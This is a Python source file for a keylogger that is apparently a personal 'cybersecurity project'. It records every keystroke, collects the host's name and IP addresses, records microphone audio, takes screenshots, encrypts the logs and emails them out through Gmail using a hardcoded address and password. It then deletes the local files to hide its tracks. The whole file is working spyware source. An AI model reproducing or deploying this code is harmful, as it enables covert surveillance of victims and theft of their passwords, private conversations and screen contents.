from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# file in which key strokes will be logged
key_logs = "key_log.txt"
e_key_logs = "e_key_logs.txt"

file_path = "D:\\Cybersecurity Projects\\Keylogger"
extension = "\\"

# email address to which log file will be sent
email_address = "demouserdemouser15@gmail.com"
password = "cr4xcgsBSsaHEY8"
toaddr = "demouserdemouser15@gmail.com"

# file for sending system information
sys_info = "sys_info.txt"
e_sys_info = "e_sys_info.txt"

# microphone time variable, the amount of time will which audion will be recorded in seconds
microphone_time = 10
audio_info = "audio.wav"

# file to store screenshot captured
screenshot_info = "screenshot.png"

# time iteration, time after which the program is called again (in seconds)
time_iteration = 15
number_of_iterations_end = 3


# basically 3 iterations after 15 seconds each

# this key is generated form GenerateKey.py file in the cryptography folder
key = "Ze8g6DapTBMCpx5bbOWT8yw3eGOzebxFCV3YxeCWGWc="

# sending the logged file as an email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    message = MIMEMultipart()
    message['From'] = fromaddr
    message['To'] = toaddr
    message['Subject'] = 'Keylogger file'
    body = "This email contains log file generated by the key logger"
    message.attach(MIMEText(body, 'plain'))

    filename = filename

    # open the attachment and read as binary
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    # message header content and defaults
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    message.attach(p)

    # creating the SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # starting a TTLS session
    s.starttls()

    # logging in to email
    s.login(fromaddr, password)

    # getting email ready
    text = message.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# sending log file in email
send_email(key_logs, file_path + extension + key_logs, toaddr)


# extracting computer information
def computer_info():
    with open(file_path + extension + sys_info, "a") as f:

        hostname = socket.gethostname()
        f.write("Hostname: " + hostname + "\n")

        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP : " + public_ip)
        except Exception:
            f.write("Error: Couldn't get public IP (ipify limit exceeded)")

        f.write("\n" + "Private IP: " + IPAddress + "\n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')


# calling the function to get he system information
computer_info()
print("Computer Info Extracted")


# Recording audio and taking screen shots of the user activity
def microphone():
    fs = 44100
    seconds = microphone_time

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extension + audio_info, fs, recording)


# calling microphone to record function for 10 seconds
microphone()
print("recording completed !")

# this function will take screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extension + screenshot_info)


screenshot()
#screenshot generated

# managing function calls using timers to iterate over the various functions after a specific time.
# counter
number_of_iterations = 0
# time at which the program is called
current_time = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    print("in function")
    # to store key strokes temporarily
    keys = []
    count = 0

    # on key stoker we perform the action
    def on_press(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # appending the keys clicked to the file
    def write_file(keys):
        with open(file_path + extension + key_logs, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    # on clicking escape, close the logger
    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False


    # Listener block
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extension + key_logs, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_info, file_path + extension + screenshot_info, toaddr)
        number_of_iterations += 1

        current_time = time.time()
        stopping_time = time.time() + time_iteration

# Encrypting files to be sent via mail
files_to_encrypt = [file_path + extension + key_logs, file_path + extension + sys_info]
encrypted_file_names = [file_path + extension + e_key_logs, file_path + extension + e_sys_info]

count = 0

for encrypting_file in files_to_encrypt:
    print("encrypting files")
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    enctypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(enctypted)
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(90)

# cleaning out our tracks and deleting the files
delete_files = [key_logs, sys_info, audio_info, screenshot_info]
for file in delete_files:
    os.remove(file_path + extension + file)

print("deleting files")